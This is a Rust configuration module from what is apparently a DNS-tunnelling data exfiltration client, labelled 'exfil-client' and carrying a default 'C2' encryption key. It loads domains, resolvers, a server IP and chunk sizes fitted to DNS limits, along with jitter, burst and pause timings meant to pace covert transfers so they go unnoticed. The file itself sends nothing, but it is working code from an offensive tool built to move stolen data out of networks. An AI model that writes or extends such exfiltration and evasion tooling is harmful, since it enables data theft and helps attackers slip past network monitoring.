use once_cell::sync::{Lazy, OnceCell};
use serde::Deserialize;
use std::{env, fs};

use crate::limits::max_supported_chunk_bytes;

#[derive(Clone)]
pub struct Config {
    pub encryption_key: &'static str,
    pub domains: &'static [&'static str],
    pub resolvers: &'static [&'static str],
    pub server_ip: &'static str,
    pub chunk_bytes: usize,
    pub jitter_min_ms: u64,
    pub jitter_max_ms: u64,
    pub chunks_per_burst: usize,
    pub burst_pause_ms: u64,
    pub chunk_retry_attempts: usize,
    pub chunk_retry_delay_ms: u64,
}

#[derive(Debug, Deserialize)]
struct FileConfig {
    encryption_key: String,
    domains: Vec<String>,
    #[serde(default)]
    resolvers: Vec<String>,
    server_ip: String,
    chunk_bytes: usize,
    jitter_min_ms: u64,
    jitter_max_ms: u64,
    chunks_per_burst: usize,
    burst_pause_ms: u64,
    #[serde(default = "default_chunk_retry_attempts")]
    chunk_retry_attempts: usize,
    #[serde(default = "default_chunk_retry_delay_ms")]
    chunk_retry_delay_ms: u64,
}

static EMBEDDED: Lazy<Config> = Lazy::new(|| Config {
    encryption_key: "MySecretC2Key123!@#DefaultChange",
    domains: &["example.com"],
    resolvers: &[],
    server_ip: "0.0.0.0",
    chunk_bytes: 180,
    jitter_min_ms: 1500,
    jitter_max_ms: 4000,
    chunks_per_burst: 5,
    burst_pause_ms: 12000,
    chunk_retry_attempts: default_chunk_retry_attempts(),
    chunk_retry_delay_ms: default_chunk_retry_delay_ms(),
});

static RUNTIME: OnceCell<Config> = OnceCell::new();
static ADJUSTMENT: OnceCell<Option<(usize, usize)>> = OnceCell::new();

impl Config {
    pub fn load() -> Self {
        if let Some(cfg) = RUNTIME.get() {
            return cfg.clone();
        }

        let base = load_runtime_config().unwrap_or_else(|| EMBEDDED.clone());
        let tuned = tune_chunk_bytes(base);
        Config::store(tuned)
    }

    fn store(cfg: Config) -> Config {
        let _ = RUNTIME.set(cfg.clone());
        cfg
    }

    pub fn dns_domains(&self) -> &[&str] {
        self.domains
    }

    pub fn resolver_endpoints(&self) -> &[&str] {
        self.resolvers
    }

    pub fn server_ip(&self) -> &str {
        self.server_ip
    }

    pub fn chunk_adjustment() -> Option<(usize, usize)> {
        ADJUSTMENT.get().cloned().unwrap_or(None)
    }

    pub fn from_file(path: &str) -> Result<Self, String> {
        let data =
            fs::read_to_string(path).map_err(|e| format!("failed to read config {path}: {e}"))?;
        Self::from_json(&data)
    }

    pub fn from_json(json: &str) -> Result<Self, String> {
        let parsed: FileConfig =
            serde_json::from_str(json).map_err(|e| format!("invalid config json: {e}"))?;
        Ok(parsed.into())
    }
}

fn load_runtime_config() -> Option<Config> {
    if let Ok(path) = env::var("EXFIL_CONFIG_PATH") {
        match Config::from_file(&path) {
            Ok(cfg) => return Some(cfg),
            Err(err) => eprintln!("[exfil-client] {err}"),
        }
    }

    if let Ok(json) = env::var("EXFIL_CONFIG_JSON") {
        match Config::from_json(&json) {
            Ok(cfg) => return Some(cfg),
            Err(err) => eprintln!("[exfil-client] {err}"),
        }
    }

    None
}

fn tune_chunk_bytes(mut cfg: Config) -> Config {
    let max_allowed = max_supported_chunk_bytes(cfg.domains);
    let original = cfg.chunk_bytes;

    if max_allowed == 0 {
        let _ = ADJUSTMENT.set(None);
        return cfg;
    }

    if cfg.chunk_bytes == 0 || cfg.chunk_bytes > max_allowed {
        cfg.chunk_bytes = max_allowed;
    }

    let adjustment = if original != cfg.chunk_bytes {
        Some((original, cfg.chunk_bytes))
    } else {
        None
    };

    let _ = ADJUSTMENT.set(adjustment);
    cfg
}

fn leak_vec(items: Vec<String>) -> &'static [&'static str] {
    let leaked: Vec<&'static str> = items
        .into_iter()
        .map(|val| Box::leak(val.into_boxed_str()) as &'static str)
        .collect();
    Box::leak(leaked.into_boxed_slice())
}

impl From<FileConfig> for Config {
    fn from(value: FileConfig) -> Self {
        Config {
            encryption_key: Box::leak(value.encryption_key.into_boxed_str()),
            domains: leak_vec(value.domains),
            resolvers: leak_vec(value.resolvers),
            server_ip: Box::leak(value.server_ip.into_boxed_str()),
            chunk_bytes: value.chunk_bytes,
            jitter_min_ms: value.jitter_min_ms,
            jitter_max_ms: value.jitter_max_ms,
            chunks_per_burst: value.chunks_per_burst,
            burst_pause_ms: value.burst_pause_ms,
            chunk_retry_attempts: value.chunk_retry_attempts,
            chunk_retry_delay_ms: value.chunk_retry_delay_ms,
        }
    }
}

const fn default_chunk_retry_attempts() -> usize {
    3
}

const fn default_chunk_retry_delay_ms() -> u64 {
    2000
}
